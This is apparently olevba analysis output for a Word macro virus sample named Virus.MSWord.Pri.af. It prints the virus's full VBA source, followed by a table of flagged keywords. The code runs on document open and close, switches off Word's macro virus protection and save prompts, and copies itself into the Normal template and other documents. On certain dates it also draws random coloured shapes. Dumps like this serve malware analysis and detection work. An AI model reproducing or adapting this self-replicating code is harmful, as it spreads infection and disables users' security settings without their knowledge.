olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-10e47493329a008adc9c1e2a4d4806d0959b40ef
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-10e47493329a008adc9c1e2a4d4806d0959b40ef - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
VP4370 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
IS250 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TI9824 = ActiveDocument.VBProject.VBComponents.Item(1)
JV247 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TI9824 = NormalTemplate.VBProject.VBComponents.Item(1)
TO5197 = True
ActiveDocument.Saved = True
End If
If TO5197 <> True And JV247 <> True Then GoTo AK4494
If TO5197 = True Then TI9824.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VP4370 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If JV247 = True Then TI9824.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IS250 - 3))
AK4494:
If IS250 <> 0 And VP4370 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Function OV3830(FG1317, BT147 As String)
On Error Resume Next
Dim VA3715 As Long: Dim VA5054 As Long: Dim PG5318 As Long: Dim RF1878 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA3715 = 1: VA5054 = 1: PG5318 = .CountOfLines: RF1878 = Len(.Lines(.CountOfLines, 1))
Do While .Find(BT147, VA3715, VA5054, PG5318, RF1878, True)
strline = .Lines(VA3715, 1)
strline = Left(strline, VA5054 - 1) & FG1317 & Mid(strline, RF1878)
.replaceline VA3715, strline
VA3715 = PG5318 + 1: VA5054 = 1:
PG5318 = .CountOfLines
RF1878 = Len(.Lines(.CountOfLines, 1))
Loop
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
VP4370 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
IS250 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TI9824 = ActiveDocument.VBProject.VBComponents.Item(1)
JV247 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set TI9824 = NormalTemplate.VBProject.VBComponents.Item(1)
TO5197 = True
ActiveDocument.Saved = True
End If
If TO5197 <> True And JV247 <> True Then GoTo AK4494
If TO5197 = True Then TI9824.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VP4370 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If JV247 = True Then TI9824.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IS250 - 3))
AK4494:
If IS250 <> 0 And VP4370 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
On Error Resume Next
Dim VA3715 As Long: Dim VA5054 As Long: Dim PG5318 As Long: Dim RF1878 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VA3715 = 1: VA5054 = 1: PG5318 = .CountOfLines: RF1878 = Len(.Lines(.CountOfLines, 1))
Do While .Find(BT147, VA3715, VA5054, PG5318, RF1878, True)
strline = .Lines(VA3715, 1)
strline = Left(strline, VA5054 - 1) & FG1317 & Mid(strline, RF1878)
.replaceline VA3715, strline
VA3715 = PG5318 + 1: VA5054 = 1:
PG5318 = .CountOfLines
RF1878 = Len(.Lines(.CountOfLines, 1))
Loop
Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

